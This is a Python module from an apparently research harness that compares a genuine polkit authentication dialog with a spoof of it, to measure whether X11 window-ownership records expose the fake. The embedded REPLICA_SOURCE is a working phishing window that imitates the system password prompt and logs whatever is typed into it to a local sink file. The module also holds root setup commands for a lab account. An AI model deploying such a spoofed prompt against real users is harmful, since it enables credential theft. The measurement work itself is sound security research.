"""
File · src/awp/os_cell.py
Purpose · The os-l3 cell (configs/cells.yaml; METHOD.md §4 (v), §6): the OS-owned authorisation prompt as the L3 reference, where the platform does
expose who drew the window, and a replica drawn by an unprivileged process beside it. This is the only cell in the matrix where provenance is
available to an observer that looks, so it is the one that shows what a provenance channel is worth.
Description · The genuine prompt is the session's own polkit agent, raised by asking pkexec to run a harmless lab command. The credential it asks for
is never the maintainer's: a polkit admin rule names a dedicated lab account as the only identity that may authenticate the lab action, so the dialog
asks for that account's password and no other; it is generated once and kept outside the tree, and the maintainer's own password is never typed by anything here. The replica is a window drawn by an ordinary unprivileged process that copies the genuine
dialog's wording and geometry, carries no privilege, and writes whatever is typed into it to the adversary's sink. Outcomes: the genuine act is the lab
command actually having run, which only a correct credential produces; the replica act is the sink receiving the secret. The provenance channel is read
through src/awp/desktop.py: the client-written window property, which the pilot measured to be both omittable and forgeable, beside the X server's own
record of the creating client, which an unprivileged client cannot write.
Inputs/Outputs · In: a running polkit agent on an X session, pkexec, the lab account's credential file, a sink event log. Out: the genuine and replica
windows, the lab command's marker file, events in the shared shape.
Depends on · src/awp/desktop.py, src/awp/proc.py, pkexec, polkit, xdotool, python-xlib.
Invariant · The maintainer's own password is never read, typed or stored; only the lab account's generated credential is used, from a file outside the
tree; every window raised here is closed by teardown; the provenance channel is read and never written.
"""

from __future__ import annotations

import json
import subprocess
import tempfile
import time
from datetime import UTC, datetime
from pathlib import Path

from awp import desktop
from awp.proc import Child

LAB_USER = "awp-polkit"
CREDENTIALS = Path("/srv/awp-polkit/.pilot-credentials")
MARKER_DIR = Path("/srv/awp-polkit/runs")
REPLICA_TITLE = "Authentication Required"


def now():
    return datetime.now(UTC).isoformat(timespec="milliseconds")


def credentials():
    """The lab account's own credential, generated once by the maintainer's setup and never the maintainer's own."""
    user, _, password = CREDENTIALS.read_text(encoding="utf-8").strip().partition(":")
    return user, password


def setup_commands():
    """What the maintainer runs once, printed rather than executed (method §B reserved actions)."""
    return [
        f"sudo useradd --system --create-home --home-dir /srv/{LAB_USER} --shell /usr/sbin/nologin {LAB_USER}",
        f"sudo chmod 711 /srv/{LAB_USER}",  # useradd makes the home private; the harness (an ordinary user) must traverse it to reach the two paths below
        f"sudo install -d -o $USER -g $USER -m 700 /srv/{LAB_USER}/runs",
        f'sudo sh -c \'p=$(openssl rand -base64 18); echo "{LAB_USER}:$p" > {CREDENTIALS}; echo "{LAB_USER}:$p" | chpasswd; chown $SUDO_USER {CREDENTIALS}; chmod 600 {CREDENTIALS}\'',
        (
            "sudo install -m 644 /dev/stdin /etc/polkit-1/rules.d/49-awp-lab.rules <<'EOF'\n"
            "// The lab's own action: pkexec of /usr/bin/touch authenticates as the lab account and never as the maintainer.\n"
            "// The admin rule names who may authenticate for it; the action rule then asks for that account's password.\n"
            "polkit.addAdminRule(function(action, subject) {\n"
            '  if (action.id == "org.freedesktop.policykit.exec" && action.lookup("program") == "/usr/bin/touch") {\n'
            f'    return ["unix-user:{LAB_USER}"];\n'
            "  }\n"
            "});\n"
            "polkit.addRule(function(action, subject) {\n"
            '  if (action.id == "org.freedesktop.policykit.exec" && action.lookup("program") == "/usr/bin/touch") {\n'
            "    return polkit.Result.AUTH_ADMIN;\n"
            "  }\n"
            "});\nEOF"
        ),
    ]


class OSLab:
    def __init__(self, events_log, adversary_sink=None):
        self.events_log = Path(events_log)
        self.adversary_sink = Path(adversary_sink) if adversary_sink else Path(tempfile.gettempdir()) / "awp-os-adversary.jsonl"
        self.nonce = self.canary = None
        self.observed = []
        self.children = []
        self.marker = None

    # ---------------------------------------------------------------- setup
    def available(self):
        return CREDENTIALS.exists() and MARKER_DIR.is_dir()

    def reset_run(self, nonce):
        self.nonce, self.observed, self.children = nonce, [], []
        _, self.canary = credentials()
        self.marker = MARKER_DIR / f"{nonce}.marker"
        self.marker.unlink(missing_ok=True)
        self.adversary_sink.write_text("", encoding="utf-8")
        return nonce

    # ---------------------------------------------------------------- the two prompts
    def trigger_genuine(self, wait_s=15.0):
        """pkexec raises the session's own polkit agent; the dialog belongs to the agent process, not to us. measured (first control run):
        the first new window id was often a transient and the agent's dialog took longer than six seconds, so the dialog is found by its name."""
        child = Child(["pkexec", "/usr/bin/touch", str(self.marker)], 120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.children.append(child)
        t0 = time.time()
        while time.time() - t0 < wait_s:
            wid = next(iter(desktop.sh(["xdotool", "search", "--onlyvisible", "--name", "Authenticat"], 5).split()), None)
            if wid:
                w = next((x for x in desktop.windows() if x["wid"] == wid), None) or {
                    "wid": wid,
                    "name": desktop.sh(["xdotool", "getwindowname", wid], 5).strip(),
                    "claimed_pid": None,
                    "server_pid": desktop.server_pid(wid),
                    "wm_class": desktop.wm_class(wid),
                }
                return {"window": w, "mechanism": "pkexec raised the session polkit agent"}
            if child.proc.poll() is not None:
                return {"window": None, "mechanism": f"pkexec exited with {child.proc.returncode} before any dialog appeared"}
            time.sleep(0.4)
        return {"window": None, "mechanism": "pkexec raised no window within the wait"}

    def place_replica(self, wait_s=6.0):
        """An ordinary unprivileged window that copies the genuine dialog; whatever is typed into it goes to the adversary's sink."""
        script = REPLICA_SOURCE.format(title=json.dumps(REPLICA_TITLE), sink=json.dumps(str(self.adversary_sink)), nonce=json.dumps(self.nonce))
        path = Path(tempfile.mkdtemp(prefix="awp-os-replica-")) / "replica.py"
        path.write_text(script, encoding="utf-8")
        child = Child(["python3", str(path)], 300, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.children.append(child)
        t0 = time.time()
        while time.time() - t0 < wait_s:
            wid = next(iter(desktop.sh(["xdotool", "search", "--onlyvisible", "--name", REPLICA_TITLE], 5).split()), None)
            if wid:
                w = next((x for x in desktop.windows() if x["wid"] == wid), None) or {
                    "wid": wid,
                    "name": REPLICA_TITLE,
                    "claimed_pid": None,
                    "server_pid": desktop.server_pid(wid),
                    "wm_class": desktop.wm_class(wid),
                }
                return {"window": w, "mechanism": "an unprivileged process drew a copy of the dialog"}
            time.sleep(0.4)
        return {"window": None, "mechanism": "the replica drew no window within the wait"}

    # ---------------------------------------------------------------- the provenance channel
    def provenance(self, window):
        """Both owner channels for a window, side by side: what the client claims, and what the X server recorded."""
        if not window:
            return None
        return {
            "wid": window.get("wid"),
            "claimed_pid": window.get("claimed_pid"),
            "server_pid": window.get("server_pid"),
            "wm_class": window.get("wm_class"),
            "agree": window.get("claimed_pid") == window.get("server_pid"),
            "note": "the claimed pid is a client-written property, measured in the pilot to be both omittable and forgeable; the server pid is the X server's own record",
        }

    # ---------------------------------------------------------------- observers
    def _record(self, act, detail, principal):
        e = {"ts": now(), "nonce": self.nonce, "principal": principal, "act": act, "origin": "x11-session", "detail": detail}
        self.observed.append(e)
        with open(self.events_log, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(e, sort_keys=True) + "\n")
        return e

    def observe(self, act="CRED"):
        if self.marker and self.marker.exists() and not any(e["principal"] == "app" for e in self.observed):
            self._record(
                act, {"canary_present": True, "canary_match": True, "note": "the privileged lab command ran, which only a correct credential produces"}, "app"
            )
        try:
            for line in self.adversary_sink.read_text(encoding="utf-8").splitlines():
                if not line.strip():
                    continue
                d = json.loads(line)
                if d.get("nonce") == self.nonce and not any(e["principal"] == "adversary" for e in self.observed):
                    self._record(
                        act,
                        {
                            "canary_present": bool(d.get("secret")) and d.get("secret") == self.canary,
                            "canary_match": d.get("secret") == self.canary,
                            "chars": len(d.get("secret") or ""),
                        },
                        "adversary",
                    )
        except OSError:
            pass
        return self.observed

    def events(self):
        return sorted(self.observed, key=lambda e: e["ts"])

    def teardown(self):
        for c in self.children:
            c.stop()
        self.children = []
        desktop.key("Escape")


REPLICA_SOURCE = '''"""An unprivileged window that copies the session's authorisation dialog. It holds no privilege and grants nothing; whatever is typed
into it is written to the adversary's sink, which is how the replica's act is observed."""
import json, tkinter as tk

SINK, NONCE = {sink}, {nonce}


def submit(entry, root):
    with open(SINK, "a", encoding="utf-8") as fh:
        fh.write(json.dumps({{"nonce": NONCE, "secret": entry.get()}}) + "\\n")
    root.destroy()


root = tk.Tk()
root.title({title})
root.geometry("420x190")
tk.Label(root, text="Authentication is required to run a program as another user", wraplength=380, justify="left").pack(padx=16, pady=(16, 4), anchor="w")
tk.Label(root, text="Password:", justify="left").pack(padx=16, anchor="w")
entry = tk.Entry(root, show="*", width=40)
entry.pack(padx=16, pady=4)
entry.focus_set()
entry.bind("<Return>", lambda _e: submit(entry, root))  # Measured: without this, Return in the replica did nothing and no sink event could occur
row = tk.Frame(root)
row.pack(padx=16, pady=12, anchor="e")
tk.Button(row, text="Cancel", command=root.destroy).pack(side="left", padx=6)
tk.Button(row, text="Authenticate", command=lambda: submit(entry, root)).pack(side="left")
root.mainloop()
'''
